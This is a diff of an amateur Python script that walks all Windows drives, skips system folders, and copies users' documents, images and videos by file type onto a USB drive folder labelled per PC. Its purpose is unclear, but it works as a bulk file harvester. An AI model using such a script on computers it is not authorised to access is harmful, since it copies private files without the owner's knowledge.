@@ -6,7 +6,7 @@ print("oof")
 theseTypes = [".png", ".jpeg", ".gif", ".mp4", ".mov", ".txt", ".pdf", ".docx", ".doc", ".pages", ".rtf", ".key", ".xls", ".xlsx", ".xlr"]
 src = ""
 # this is another dead_end "C:\\Users\\NNguyen\\Desktop\\lol"
-dead_ends = ["C:\\Dell", "C:\\Intel", "C:\\Log Files", "C:\\Microsoft", "C:\\oracle", "C:\\PerfLogs", "C:\\Windows", "C:\\Program Files (x86)", "C:\\Program Files"]
+dead_ends = ["C:\\$Recycle.Bin", "C:\\Dell", "C:\\Intel", "C:\\Log Files", "C:\\Microsoft", "C:\\oracle", "C:\\PerfLogs", "C:\\Windows", "C:\\Program Files (x86)", "C:\\Program Files"]
 
 
 def get_drives():
@@ -18,16 +18,14 @@ def get_drives():
         bitmask >>= 1
 
     return drives
-
-
 if __name__ == '__main__':
     print (get_drives())   
+
+
 usb = input("\nUSB? ")
-dst = f"{usb.upper()}:\\LMAOBOX\\pc_1"
+dst = f"{usb.upper()}:\\LMAOBOX\\pc_0"
 #dst = f"{usb.upper()}:\\Users\\NNguyen\\Desktop\\lol\\dst\\lol"
 print(dst)
-
-
 top = []           
 a=0        
 while a<2:
@@ -40,7 +38,7 @@ while a<2:
 
 
 for oneFolder in theseTypes:
-    os.makedirs(dst + oneFolder)        #fix this line or make sure this will work (dst + the specific folder that will only contain one type)
+    os.makedirs("{}\\{}".format (dst, oneFolder))        
 
 
 def detecting_file(thisType):
@@ -48,7 +46,7 @@ def detecting_file(thisType):
         src = join(theDirPath, file)
         print(src)
         try:
-            shutil.copy2(src,dst)                        #TODO: dst should be the correct folder based on its file type 
+            shutil.copy2(src,"{}\\{}".format(dst, thisType))                        
         except PermissionError:
             print("\n\n\n\n\n\n\n\n\n\n\n\nno permission^\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
 
@@ -61,15 +59,11 @@ for oneTop in top:
             continue
         else:
             for file in theFileNames:
-                detecting_file(".txt")
-                detecting_file(".png")
-                detecting_file(".pdf")
-                detecting_file(".jpeg")
-                detecting_file(".docx")
-                detecting_file(".xlsx")
-                detecting_file(".xls")
+                for oneType in theseTypes:
+                    detecting_file(oneType)
+                    #I could make an if command right here to break this for loop when it actually copies so we dont have to go down and finish the list even though it already copied it (save time?)
 
-                # triple for loop has not been tested 8/19/19
+              
 
 
 b = 0
